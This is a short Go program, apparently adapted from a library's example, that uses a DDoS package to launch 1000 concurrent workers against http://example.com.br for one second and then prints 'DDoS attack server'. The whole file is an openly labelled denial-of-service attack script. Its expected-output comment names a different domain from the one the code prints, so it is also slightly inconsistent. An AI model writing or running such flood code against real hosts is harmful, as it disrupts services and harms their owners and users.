package main

import (

    "fmt"
//	"net/http"
	"os"
//	"strconv"
//	"testing"
	"time"

	ddos "github.com/Konstantin8105/DDoS"
//	freeport "github.com/Konstantin8105/FreePort"

)

func main() {
	workers := 1000
	d, err := ddos.New("http://example.com.br", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Fprintf(os.Stdout, "DDoS attack server: http://example.com.br\n")
	// Output:
	// DDoS attack server: http://example.com
}

